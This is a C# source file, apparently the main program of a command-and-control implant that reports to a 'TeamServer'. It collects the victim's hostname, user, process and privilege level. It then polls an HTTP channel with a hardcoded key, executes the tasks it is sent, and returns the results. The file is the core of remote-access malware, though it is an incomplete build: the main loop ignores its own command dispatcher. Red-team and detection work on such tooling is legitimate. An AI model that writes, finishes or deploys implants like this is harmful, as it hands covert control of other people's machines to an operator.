using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Security.Principal;
using System.Threading;

using Agent.Models;

namespace Agent
{
    internal static class Program
    {
        private static AgentMetadata _metadata;
        private static CommModule _commModule;
        private static CancellationTokenSource _tokenSource;

        private static List<AgentCommand> _commands = new List<AgentCommand>();
        
        private static void Main(string[] args)
        {
            GenerateMetadata();
            LoadAgentCommands();

            // In a real deployment, this key would be baked in at build time
            // For now we define it here — it MUST match the TeamServer's Encryption:Key
            const string encryptionKey = "551b0a5a-49b0-44dd-8294-d64773d8ef93";

            _commModule = new HttpCommModule("localhost", 8080, encryptionKey);
            _commModule.Init(_metadata);
            _commModule.Start();

            _tokenSource = new CancellationTokenSource();

            while (!_tokenSource.IsCancellationRequested)
            {
                if (_commModule.RecvData(out var tasks))
                {
                    foreach (var task in tasks)
                    {
                        // For now, we use your TestCommand logic
                        var command = new Agent.Commands.TestCommand();
                        var result = command.Execute(task);

                        // Send the result back to the outbound queue
                        var taskResult = new AgentTaskResult { Id = task.Id, Result = result };
                        _commModule.SendData(taskResult);
                    }
                }
                Thread.Sleep(100); // Small sleep to save CPU
            }
        }

        private static void HandleTasks(IEnumerable<AgentTask> tasks)
        {
            foreach (var task in tasks)
            {
                HandleTask(task);
            }
        }

        private static void HandleTask(AgentTask task)
        {
            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command));
            if (command is null) return;

            var result = command.Execute(task);
            SendTaskResult(task.Id, result);
        }

        private static void SendTaskResult(string taskId, string result)
        {
            var taskResult = new AgentTaskResult
            {
                Id = taskId,
                Result = result
            };
            
            _commModule.SendData(taskResult);
        }

        private static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);

            var integrity = "Medium";

            if (identity.IsSystem)
            {
                integrity = "SYSTEM";
            }
            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                integrity = "High";
            }

            _metadata = new AgentMetadata
            {
                Id = Guid.NewGuid().ToString(),
                Hostname = Environment.MachineName,
                Username = identity.Name,
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                Integrity = integrity,
                Architecture = IntPtr.Size == 8 ? "x64" : "x86"
            };

            process.Dispose();
            identity.Dispose();
        }

        private static void LoadAgentCommands()
        {
            var self = Assembly.GetExecutingAssembly();

            foreach (var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(AgentCommand)))
                {
                    var instance = (AgentCommand)Activator.CreateInstance(type);
                    _commands.Add(instance);
                }
            }
        }
    }
}